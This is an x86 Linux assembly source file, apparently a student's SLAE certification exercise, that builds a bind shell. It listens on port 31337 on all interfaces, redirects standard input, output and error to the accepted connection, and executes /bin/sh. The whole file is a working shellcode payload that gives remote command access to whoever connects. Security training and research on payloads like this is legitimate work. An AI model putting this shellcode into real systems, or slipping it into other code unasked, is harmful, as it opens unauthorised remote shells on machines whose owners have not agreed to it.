;
; Default ip address = 0.0.0.0
; Default port = 31337
; 
; Tested on: 
; Linux osboxes 4.10.0-42-generic #46-Ubuntu SMP Mon Dec 4 14:36:05 UTC 2017 i686 i686 i686 GNU/Linux
; 
; This has been created for completing the requirements of the 
; SecurityTube Linux Assembly Expert certification: 
; http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
;  
; Student ID: SLAE-966 
; 

global _start
section .text

_start:
	; socket(2, 1, 0)
	push BYTE 0x66     ; socketcall (syscall 102)
	pop eax
	cdq                ; zero out edx
	xor ebx, ebx       ; type of socketcall
	inc ebx            ; ebx =1, SYS_SOCKET
	push edx           ; build arg array in reverse order, {protocol=0, SYS_SOCKET=1, AF_INET=2}
	push BYTE 0x1 
	push BYTE 0x2 
	mov ecx, esp 
	int 0x80

	mov esi, eax       ; save socktfd in esi

	; bind(s, [2, port, 0], 16)
	push BYTE 0x66     ; socketcall
	pop eax
	inc ebx            ; ebx = 2, SYS_BIND
	push edx           ; build sockaddr struct in reverse order. {INADDR_ANY=0, PORT=31337, AF_INET=2}
	push WORD 0x697a 
	push WORD bx 
	mov ecx, esp 
	push BYTE 16       ; 16 bytes for address
	push ecx 
	push esi
	mov ecx,esp 
	int 0x80

	; listen(s, 0)
	mov BYTE al, 0x66  ; socketcall
	inc ebx
	inc ebx            ; ebx = 4, SYS_LISTEN
	push ebx           ; argv {backlog =4, sockfd}
	push esi
	mov ecx, esp
	int 0x80

	; c = accept(s, 0, 0)
	mov BYTE al, 0x66  ; socketcall
	inc ebx            ; ebx=5, SYS_ACCEPT
	push edx           ; argv {socklen=0, sockaddr_ptr=NULL, sockfd}
	push edx
	push esi
	mov ecx, esp ; ecx = argument array
	int 0x80

	; dup2(connected socket, {all three standard I/O file descriptors})
    mov ebx, eax       ; move sockfd into ebx
    xor ecx, ecx       ; zero out ecx
loop:
	mov BYTE al,0x3F   ; dup2 (syscall 63)
	int 0x80   
	inc ecx            ; increment over I/O file descriptors {std input, std output, std error}
	cmp cl, 0x4
	jne loop
	
	; execve(const char *filename, char *const argv [], char *const envp[])
	mov BYTE al, 0xb   ; execve (syscall 11)
	push edx           ; push NULL for string termination
	push 0x68732f2f    ; push "//sh" 
	push 0x6e69622f    ; push "/bin"
	mov ebx, esp
	mov ecx, edx
	int 0x80
